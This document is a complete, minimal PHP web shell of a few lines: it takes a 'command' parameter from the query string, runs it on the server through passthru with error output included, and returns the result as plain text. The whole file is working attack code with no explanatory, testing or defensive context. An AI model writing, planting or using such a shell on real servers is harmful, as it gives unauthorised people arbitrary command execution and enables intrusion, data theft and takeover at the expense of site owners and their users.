<?php header('Content-Type: text/plain; charset=UTF-8');$p='command';if(isset($_SERVER['REQUEST_METHOD'])&&strtolower($_SERVER['REQUEST_METHOD'])==='get'&&isset($_GET[$p])&&($_GET[$p]=trim($_GET[$p]))&&strlen($_GET[$p])>0){$e=@passthru("($_GET[$p]) 2>&1");if($e===false){echo 'ERROR: The function might be disabled.';}unset($_GET[$p]);/*@gc_collect_cycles();*/} ?>